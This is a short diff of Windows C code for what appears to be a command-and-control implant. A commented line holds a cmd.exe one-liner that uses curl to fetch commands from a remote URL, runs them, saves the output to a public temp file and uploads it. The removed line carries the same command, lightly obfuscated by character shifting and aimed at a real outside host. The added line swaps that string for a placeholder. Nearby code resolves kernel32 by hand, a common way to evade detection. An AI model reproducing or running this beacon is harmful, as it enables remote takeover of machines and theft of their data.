@@ -27,7 +27,7 @@ int main()
     //LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl URL_TO_GET_COMMANDS') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" URL_TO_UPLOAD_OUTPUT \" ";
     
     //simple encoding added to the command
-    char cmd[] = "dne/fyf!0d!#gps!0g!#efmjnt>#!&j!jo!)(dvsm!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0ebub/qiq(*!ep!tfu!pvuqvu>&j!''!&j!?!D;]vtfst]qvcmjd]ufnq/uyu!''!dvsm!..gpsn!#gjmfUpVqmpbe>AD;]vtfst]qvcmjd]ufnq/uyu#!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0hfugjmf/qiq#!";
+    char cmd[] = "Encoded url here.... simple encoding just +1 character";
 
 	// resolve kernel32 image base
     LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
